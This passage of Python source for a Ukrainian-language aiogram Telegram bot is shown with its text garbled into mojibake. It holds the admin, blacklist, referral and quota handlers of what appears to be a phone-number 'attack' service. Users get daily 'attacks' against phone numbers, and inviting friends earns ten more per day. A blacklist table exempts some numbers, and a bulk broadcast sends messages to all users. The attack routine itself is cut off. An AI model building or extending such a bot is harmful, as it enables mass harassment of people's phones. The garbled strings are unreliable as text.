        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤.")

@dp.message_handler(text='–ù–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º')
async def broadcast_prompt(message: Message):
    if message.from_user.id in ADMIN:
        await Dialog.spam.set()
        await message.answer('–í–≤–µ–¥—ñ—Ç—å –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤:')
    else:
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤.")

@dp.message_handler(state=Dialog.spam, content_types=[types.ContentType.TEXT, types.ContentType.PHOTO, types.ContentType.VIDEO, types.ContentType.DOCUMENT])
async def broadcast_message(message: Message, state: FSMContext):
    text = message.text if message.text else ""
    content_type = "text" if message.text else "unknown"

    if message.photo:
        content_type = "photo"
        photo_id = message.photo[-1].file_id
    elif message.video:
        content_type = "video"
        video_id = message.video.file_id
    elif message.document:
        content_type = "document"
        document_id = message.document.file_id

    async with db_pool.acquire() as conn:
        users = await conn.fetch('SELECT user_id FROM users')
    
    success_count = 0
    error_count = 0

    for user in users:
        user_id = user['user_id']
        try:
            if content_type == "text":
                await bot.send_message(user_id, text)
            elif content_type == "photo":
                await bot.send_photo(user_id, photo_id, caption=text)
            elif content_type == "video":
                await bot.send_video(user_id, video_id, caption=text)
            elif content_type == "document":
                await bot.send_document(user_id, document_id, caption=text)
            success_count += 1
        except BotBlocked:
            logging.error(f"–ë–æ—Ç–∞ –∑–∞–±–ª–æ–∫—É–≤–∞–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á {user_id}. –ü—Ä–æ–ø—É—Å–∫–∞—î–º–æ –π–æ–≥–æ.")
            error_count += 1
        except UserDeactivated:
            logging.error(f"–ö–æ—Ä–∏—Å—Ç—É–≤–∞—á {user_id} –¥–µ–∞–∫—Ç–∏–≤—É–≤–∞–≤ –∞–∫–∫–∞—É–Ω—Ç. –ü—Ä–æ–ø—É—Å–∫–∞—î–º–æ –π–æ–≥–æ.")
            error_count += 1
        except ChatNotFound:
            logging.error(f"–ß–∞—Ç –∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º {user_id} –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ. –ü—Ä–æ–ø—É—Å–∫–∞—î–º–æ –π–æ–≥–æ.")
            error_count += 1
        except Exception as e:
            logging.error(f"–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É {user_id}: {str(e)}")
            error_count += 1
        await asyncio.sleep(random.uniform(0.4, 1.1)) # <= –î–æ–¥–∞—î–º –ø–∞—É–∑—É

    await message.answer(f'–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ!\n–£—Å–ø—ñ—à–Ω–æ: {success_count}\n–ü–æ–º–∏–ª–æ–∫: {error_count}')
    await state.finish()

@dp.message_handler(text="–î–æ–¥–∞—Ç–∏ –Ω–æ–º–µ—Ä –¥–æ —á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É")
async def add_to_blacklist_start(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("üî¥ <b>–î–æ–¥–∞–≤–∞–Ω–Ω—è –Ω–æ–º–µ—Ä–∞ –¥–æ —á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É</b>\n\n–í–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:\n–ü—Ä–∏–∫–ª–∞–¥: <i>üá∫üá¶380xxxxxxxxx</i>\n\nüí° –í–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç–∏ <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏ –æ–ø–µ—Ä–∞—Ü—ñ—ó.", parse_mode="html")
        await Dialog.add_to_blacklist.set()
    else:
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤.")

@dp.message_handler(state=Dialog.add_to_blacklist)
async def add_to_blacklist_process(message: Message, state: FSMContext):
    phone = message.text.strip()
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –Ω–∞ —Å–∫–∞—Å—É–≤–∞–Ω–Ω—è
    if phone.lower() in ['—Å–∫–∞—Å—É–≤–∞—Ç–∏', '–æ—Ç–º–µ–Ω–∞', '–æ—Ç–º—ñ–Ω–∏—Ç–∏', 'cancel']:
        await state.finish()
        await message.answer("‚ùå –û–ø–µ—Ä–∞—Ü—ñ—é —Å–∫–∞—Å–æ–≤–∞–Ω–æ.", reply_markup=profile_keyboard)
        return
    
    # –í–∏–¥–∞–ª—è—î–º–æ –≤—Å—ñ —Å–∏–º–≤–æ–ª–∏ –æ–∫—Ä—ñ–º —Ü–∏—Ñ—Ä
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'):
        phone = '380' + phone[1:]

    if not re.match(r"^\d{12}$", phone):
        await message.answer("‚ùå –ù–µ–≤—ñ—Ä–Ω–∏–π —Ñ–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞.\n\n–í–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä –ø–æ–≤—Ç–æ—Ä–Ω–æ –∞–±–æ –Ω–∞–ø–∏—à—ñ—Ç—å <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏.\n–ü—Ä–∏–∫–ª–∞–¥: <i>üá∫üá¶380XXXXXXXXX</i>", parse_mode="html")
        return

    try:
        async with db_pool.acquire() as conn:
            await conn.execute("INSERT INTO blacklist (phone_number) VALUES ($1) ON CONFLICT DO NOTHING", phone)
        await message.answer(f"‚úÖ –ù–æ–º–µ—Ä {phone} –¥–æ–¥–∞–Ω–æ –¥–æ —á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É.", parse_mode="html", reply_markup=profile_keyboard)
    except Exception as e:
        await message.answer("‚ùå –°—Ç–∞–ª–∞—Å—è –ø–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –¥–æ–¥–∞–≤–∞–Ω–Ω—ñ –Ω–æ–º–µ—Ä–∞ –¥–æ —á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É.", parse_mode="html", reply_markup=profile_keyboard)
        logging.error(f"–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –¥–æ–¥–∞–≤–∞–Ω–Ω—ñ –≤ —á–æ—Ä–Ω–∏–π —Å–ø–∏—Å–æ–∫: {e}")
    
    await state.finish()

@dp.message_handler(commands=['block'])
async def add_to_blacklist(message: Message):
    args = message.get_args()
    
    if not args:
        await message.answer("–ë—É–¥—å –ª–∞—Å–∫–∞, –≤–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É –¥–ª—è –¥–æ–¥–∞–≤–∞–Ω–Ω—è –¥–æ —á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É.\n–ü—Ä–∏–∫–ª–∞–¥: /block 380XXXXXXXXX")
        return
    
    phone = args.strip()
    
    if not re.match(r"^\d{12}$", phone):
        await message.answer("–ù–æ–º–µ—Ä –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ —Ñ–æ—Ä–º–∞—Ç—É: 380–•–•–•–•–•–•–•–•–•. –ë—É–¥—å –ª–∞—Å–∫–∞, –≤–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä –ø–æ–≤—Ç–æ—Ä–Ω–æ.")
        return

    try:
        async with db_pool.acquire() as conn:
            await conn.execute("INSERT INTO blacklist (phone_number) VALUES ($1) ON CONFLICT DO NOTHING", phone)
        await message.answer(f"–ù–æ–º–µ—Ä {phone} –¥–æ–¥–∞–Ω–æ –¥–æ —á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É.")
    except Exception as e:
        await message.answer("–°—Ç–∞–ª–∞—Å—è –ø–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –¥–æ–¥–∞–≤–∞–Ω–Ω—ñ –Ω–æ–º–µ—Ä–∞ –¥–æ —á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É.")
        print(f"–ü–æ–º–∏–ª–∫–∞: {e}")

@dp.message_handler(commands=['nonstart'])
async def nonstart(message: Message):
    empty_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    await message.answer("–Ø –∂ —Å–∫–∞–∑–∞–≤ –Ω–µ –Ω–∞—Ç–∏—Å–∫–∞—Ç–∏...", reply_markup=empty_keyboard)


@dp.message_handler(text="–ó–∞–±–ª–æ–∫—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞")
async def block_user(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("üî¥ <b>–ë–ª–æ–∫—É–≤–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞</b>\n\n–í–≤–µ–¥—ñ—Ç—å ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è –±–ª–æ–∫—É–≤–∞–Ω–Ω—è:\n\nüí° –í–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç–∏ <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏.", parse_mode="html")
        await Dialog.block_user.set()
    else:
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤.")

@dp.message_handler(state=Dialog.block_user)
async def process_block(message: Message, state: FSMContext):
    user_id = message.text.strip()
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –Ω–∞ —Å–∫–∞—Å—É–≤–∞–Ω–Ω—è
    if user_id.lower() in ['—Å–∫–∞—Å—É–≤–∞—Ç–∏', '–æ—Ç–º–µ–Ω–∞', '–æ—Ç–º—ñ–Ω–∏—Ç–∏', 'cancel']:
        await state.finish()
        await message.answer("‚ùå –û–ø–µ—Ä–∞—Ü—ñ—é —Å–∫–∞—Å–æ–≤–∞–Ω–æ.", reply_markup=profile_keyboard)
        return
    
    if user_id.isdigit():
        user_id = int(user_id)
        async with db_pool.acquire() as conn:
            await conn.execute("UPDATE users SET block = $1 WHERE user_id = $2", 1, user_id)
        await message.answer(f"‚úÖ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ ID {user_id} –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ.", reply_markup=profile_keyboard)
    else:
        await message.answer("‚ùå –ù–µ–∫–æ—Ä–µ–∫—Ç–Ω–∏–π ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.\n\n–í–≤–µ–¥—ñ—Ç—å —á–∏—Å–ª–æ–≤–∏–π ID –∞–±–æ –Ω–∞–ø–∏—à—ñ—Ç—å <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏.", parse_mode="html")
        return
    
    await state.finish()

@dp.message_handler(text="–†–æ–∑–±–ª–æ–∫—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞")
async def unblock_user(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("üü¢ <b>–†–æ–∑–±–ª–æ–∫—É–≤–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞</b>\n\n–í–≤–µ–¥—ñ—Ç—å ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è —Ä–æ–∑–±–ª–æ–∫—É–≤–∞–Ω–Ω—è:\n\nüí° –í–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç–∏ <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏.", parse_mode="html")
        await Dialog.unblock_user.set()
    else:
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤.")

@dp.message_handler(state=Dialog.unblock_user)
async def process_unblock(message: Message, state: FSMContext):
    user_id = message.text.strip()
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –Ω–∞ —Å–∫–∞—Å—É–≤–∞–Ω–Ω—è
    if user_id.lower() in ['—Å–∫–∞—Å—É–≤–∞—Ç–∏', '–æ—Ç–º–µ–Ω–∞', '–æ—Ç–º—ñ–Ω–∏—Ç–∏', 'cancel']:
        await state.finish()
        await message.answer("‚ùå –û–ø–µ—Ä–∞—Ü—ñ—é —Å–∫–∞—Å–æ–≤–∞–Ω–æ.", reply_markup=profile_keyboard)
        return
    
    if user_id.isdigit():
        user_id = int(user_id)
        async with db_pool.acquire() as conn:
            await conn.execute("UPDATE users SET block = $1 WHERE user_id = $2", 0, user_id)
        await message.answer(f"‚úÖ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ ID {user_id} —Ä–æ–∑–±–ª–æ–∫–æ–≤–∞–Ω–æ.", reply_markup=profile_keyboard)
    else:
        await message.answer("‚ùå –ù–µ–∫–æ—Ä–µ–∫—Ç–Ω–∏–π ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.\n\n–í–≤–µ–¥—ñ—Ç—å —á–∏—Å–ª–æ–≤–∏–π ID –∞–±–æ –Ω–∞–ø–∏—à—ñ—Ç—å <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏.", parse_mode="html")
        return
    
    await state.finish()

@dp.message_handler(text="–†–µ—Ñ–µ—Ä–∞–ª–∏")
async def show_referrals(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            referrals = await conn.fetch('''
                SELECT user_id, name, username, referral_count 
                FROM users 
                WHERE referral_count > 0 
                ORDER BY referral_count DESC
            ''')
        
        if not referrals:
            await message.answer("–ü–æ–∫–∏ —â–æ –Ω–µ–º–∞—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ —Ä–µ—Ñ–µ—Ä–∞–ª–∞–º–∏.")
            return
        
        message_text = "üë• <b>–ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ —Ä–µ—Ñ–µ—Ä–∞–ª–∞–º–∏:</b>\n\n"
        
        for ref in referrals:
            user_id = ref['user_id']
            name = ref['name'] or "–ë–µ–∑ —ñ–º–µ–Ω—ñ"
            username = ref['username'] or "–ë–µ–∑ username"
            count = ref['referral_count']
            
            message_text += f"‚Ä¢ <a href='tg://user?id={user_id}'>{name}</a> (@{username})\n"
            message_text += f"  ‚îî –ö—ñ–ª—å–∫—ñ—Å—Ç—å —Ä–µ—Ñ–µ—Ä–∞–ª—ñ–≤: {count}\n\n"
        
        await message.answer(message_text, parse_mode="HTML")
    else:
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤.")

@dp.message_handler(text="–ù–∞–∑–∞–¥")
async def back_to_admin_menu(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer('–í–∏ –ø–æ–≤–µ—Ä–Ω—É–ª–∏—Å—å –¥–æ –≥–æ–ª–æ–≤–Ω–æ–≥–æ –º–µ–Ω—é.', reply_markup=profile_keyboard)
    else:
        await message.answer('–í–∏ –Ω–µ —î –∞–¥–º—ñ–Ω–æ–º.')

@dp.message_handler(text='üÜò –î–æ–ø–æ–º–æ–≥–∞')
@dp.throttled(anti_flood, rate=3)
async def help(message: types.Message):
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("–í–∞—Å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —ñ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.")
        return

    if not await check_subscription_status(user_id):
        await message.answer("–í–∏ –≤—ñ–¥–ø–∏—Å–∞–ª–∏—Å—è –≤—ñ–¥ –∫–∞–Ω–∞–ª—É. –ü—ñ–¥–ø–∏—à—ñ—Ç—å—Å—è, —â–æ–± –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞.", reply_markup=checkSubMenu)
        return
    
    inline_keyboard = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='üé™ –ö–∞–Ω–∞–ª', url='https://t.me/+tod0WSFEpEQ2ODcy')
    inline_keyboard = inline_keyboard.add(code_sub)
    await bot.send_message(message.chat.id, "–í–∏–Ω–∏–∫–ª–∏ –ø–∏—Ç–∞–Ω–Ω—è –∞–±–æ –∑–Ω–∞–π—à–ª–∏ –ø—Ä–æ–±–ª–µ–º—É? –ó–≤–µ—Ä—Ç–∞–π—Å—è –¥–æ @Nobysss", disable_web_page_preview=True, parse_mode="HTML", reply_markup=inline_keyboard)



@dp.message_handler(text='üé™ –ó–∞–ø—Ä–æ—Å–∏—Ç–∏ –¥—Ä—É–≥–∞')
@dp.throttled(anti_flood, rate=3)
async def referral_program(message: types.Message):
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        
        await message.answer("–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("–í–∞—Å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —ñ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.")
        return
    
    if not await check_subscription_status(user_id):
        await message.answer("–í–∏ –≤—ñ–¥–ø–∏—Å–∞–ª–∏—Å—è –≤—ñ–¥ –∫–∞–Ω–∞–ª—É. –ü—ñ–¥–ø–∏—à—ñ—Ç—å—Å—è, —â–æ–± –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞.", reply_markup=checkSubMenu)
        return
    
    async with db_pool.acquire() as conn:
        referral_data = await conn.fetchrow(
            'SELECT referral_count, referral_attacks, unused_referral_attacks FROM users WHERE user_id = $1',
            user_id
        )
        
        referral_count = referral_data['referral_count'] if referral_data else 0
        referral_attacks = referral_data['referral_attacks'] if referral_data else 0
        unused_referral_attacks = referral_data['unused_referral_attacks'] if referral_data else 0
        
        referral_total = referral_attacks + unused_referral_attacks
        
        bot_username = (await bot.me).username
        referral_link = f"https://t.me/{bot_username}?start={user_id}"
        
        referrals = await conn.fetch(
            'SELECT u.user_id, u.name, u.username, r.join_date FROM referrals r JOIN users u ON r.referred_id = u.user_id WHERE r.referrer_id = $1 ORDER BY r.join_date DESC',
            user_id
        )
    
    message_text = f"üé™ <b>–ó–∞–ø—Ä–æ—Å–∏—Ç–∏ –¥—Ä—É–≥–∞</b>\n\n"
    message_text += f"üîó –í–∞—à–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è:\n<code>{referral_link}</code>\n\n"
    message_text += "üí∞ <b>–©–æ —Ç–∏ –æ—Ç—Ä–∏–º—É—î—à?</b>\n"
    message_text += "‚úÖ –¢–∏ –æ—Ç—Ä–∏–º—É—î—à <b>+10 –∞—Ç–∞–∫ –Ω–∞ –æ–¥–∏–Ω –¥–µ–Ω—å</b>\n"
    message_text += "‚úÖ –¢–≤—ñ–π –¥—Ä—É–≥ —Ç–∞–∫–æ–∂ –æ—Ç—Ä–∏–º—É—î <b>+10 –∞—Ç–∞–∫ –Ω–∞ –æ–¥–∏–Ω –¥–µ–Ω—å</b>\n\n"
    message_text += "üìã <b>–Ø–∫ —Ü–µ –ø—Ä–∞—Ü—é—î?</b>\n"
    message_text += "1Ô∏è‚É£ –°–∫–æ–ø—ñ—é–π –ø–æ—Å–∏–ª–∞–Ω–Ω—è –≤–∏—â–µ\n"
    message_text += "2Ô∏è‚É£ –í—ñ–¥–ø—Ä–∞–≤ –¥—Ä—É–≥—É —É Telegram\n"
    message_text += "3Ô∏è‚É£ –ö–æ–ª–∏ –¥—Ä—É–≥ –Ω–∞—Ç–∏—Å–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è —ñ –ø—ñ–¥–ø–∏—à–µ—Ç—å—Å—è –Ω–∞ –∫–∞–Ω–∞–ª ‚Äî –≤–∏ –æ–±–∏–¥–≤–∞ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –ø–æ +10 –∞—Ç–∞–∫ –Ω–∞ —Å—å–æ–≥–æ–¥–Ω—ñ!\n\n"
    message_text += "‚ö° <b>–í–∞–∂–ª–∏–≤–æ:</b>\n"
    message_text += "‚Ä¢ –ê—Ç–∞–∫–∏ –Ω–∞—Ä–∞—Ö–æ–≤—É—é—Ç—å—Å—è —Ç—ñ–ª—å–∫–∏ –Ω–∞ –ø–æ—Ç–æ—á–Ω–∏–π –¥–µ–Ω—å\n"
    message_text += "‚Ä¢ –ö–æ–∂–µ–Ω –Ω–æ–≤–∏–π –¥—Ä—É–≥ = –Ω–æ–≤—ñ +10 –∞—Ç–∞–∫ –¥–ª—è –≤–∞—Å –æ–±–æ—Ö\n"
    message_text += "‚Ä¢ –û–±–º–µ–∂–µ–Ω—å –Ω–∞ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∑–∞–ø—Ä–æ—à–µ–Ω–∏—Ö –¥—Ä—É–∑—ñ–≤ –Ω–µ–º–∞—î!\n\n"
    
    if referrals:
        message_text += f"üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</b>\n"
        message_text += f"‚îú –í—Å—å–æ–≥–æ —Ä–µ—Ñ–µ—Ä–∞–ª—ñ–≤: {referral_count}\n"
        message_text += f"‚îú –î–æ—Å—Ç—É–ø–Ω–æ –∞—Ç–∞–∫ –æ—Ç —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤: {referral_total}\n"
        if unused_referral_attacks > 0:
            message_text += f"‚îî –ù–∞–∫–æ–ø–∏—á–µ–Ω–æ –∞—Ç–∞–∫: {unused_referral_attacks}\n"
        message_text += f"\n<b>–í–∞—à—ñ —Ä–µ—Ñ–µ—Ä–∞–ª–∏:</b>\n"
        for ref in referrals:
            ref_name = ref['username'] or ref['name'] or f"User{ref['user_id']}"
            message_text += f"‚Ä¢ <a href='tg://user?id={ref['user_id']}'>{ref_name}</a> - {ref['join_date'].strftime('%d.%m.%Y')}\n"
    
    keyboard = InlineKeyboardMarkup()
    # –§–æ—Ä–º–∞—Ç—É—î–º–æ —Ç–µ–∫—Å—Ç –±–µ–∑ –ø–æ—Å–∏–ª–∞–Ω–Ω—è - –≤–æ–Ω–æ –±—É–¥–µ —Ç—ñ–ª—å–∫–∏ –≤ –ø—Ä–µ–≤—å—é
    share_text = f"–ü—Ä–∏–≤—ñ—Ç! –ü—Ä–∏—î–¥–Ω—É–π—Å—è –¥–æ –Ω–∞—à–æ–≥–æ –±–æ—Ç—É! üì± –ó–∞–≤–¥—è–∫–∏ —Ç–æ–±—ñ –º–∏ –∑–º–æ–∂–µ–º–æ –∑—Ä–æ—Å—Ç–∞—Ç–∏ —Ç–∞ —Ä–æ–±–∏—Ç–∏ –¥–ª—è —Ç–µ–±–µ —â–µ –±—ñ–ª—å—à–µ üöÄ"
    encoded_text = urllib.parse.quote(share_text)
    # –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ –ø–∞—Ä–∞–º–µ—Ç—Ä url –∑ referral_link –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ start - –ø–æ—Å–∏–ª–∞–Ω–Ω—è –±—É–¥–µ –≤ –ø—Ä–µ–≤—å—é (–∫–ª—ñ–∫–∞–±–µ–ª—å–Ω–µ)
    encoded_url = urllib.parse.quote(referral_link)
    # –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ –æ–±–∏–¥–≤–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ - –ø–æ—Å–∏–ª–∞–Ω–Ω—è –±—É–¥–µ —Ç—ñ–ª—å–∫–∏ –≤ –ø—Ä–µ–≤—å—é, –±–µ–∑ –¥—É–±–ª—é–≤–∞–Ω–Ω—è
    share_url = f"https://t.me/share/url?url={encoded_url}&text={encoded_text}"
    keyboard.add(InlineKeyboardButton("üéØ –ü–æ–¥—ñ–ª–∏—Ç–∏—Å—è –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º", url=share_url))
    
    await message.answer(message_text, parse_mode='HTML', reply_markup=keyboard)

@dp.message_handler(text='‚ùì –ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –∞—Ç–∞–∫–∏')
@dp.throttled(anti_flood, rate=3)
async def check_user_attacks(message: types.Message):
    user_id = message.from_user.id
    can_attack, attacks_left, promo_attacks, referral_attacks = await check_attack_limits(user_id)
    total = attacks_left + promo_attacks + referral_attacks
    text = f'‚öîÔ∏è <b>–í–∞—à—ñ –∞—Ç–∞–∫–∏ –Ω–∞ —Å—å–æ–≥–æ–¥–Ω—ñ:</b>\n\n' \
           f'üéØ –ó–≤–∏—á–∞–π–Ω–∏—Ö –∞—Ç–∞–∫: <b>{attacks_left}</b>\n' \
           f'üéÅ –ü—Ä–æ–º–æ –∞—Ç–∞–∫: <b>{promo_attacks}</b>\n' \
           f'üé™ –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∏—Ö –∞—Ç–∞–∫: <b>{referral_attacks}</b>\n\n' \
           f'üîÑ –ê—Ç–∞–∫–∏ –≤—ñ–¥–Ω–æ–≤–ª—è—é—Ç—å—Å—è –æ 00:00'
    await message.answer(text, parse_mode='HTML')

@dp.message_handler(text='üéØ –ü–æ—á–∞—Ç–∏ –∞—Ç–∞–∫—É')
@dp.throttled(anti_flood, rate=3)
async def start_attack_prompt(message: Message):
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if message.chat.type != 'private':
        return  # –Ü–≥–Ω–æ—Ä—É—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –≥—Ä—É–ø
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("–í–∞—Å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —ñ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.")
        return
    
    if not await check_subscription_status(user_id):
        await message.answer("–í–∏ –≤—ñ–¥–ø–∏—Å–∞–ª–∏—Å—è –≤—ñ–¥ –∫–∞–Ω–∞–ª—É. –ü—ñ–¥–ø–∏—à—ñ—Ç—å—Å—è, —â–æ–± –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞.", reply_markup=checkSubMenu)
        return
    
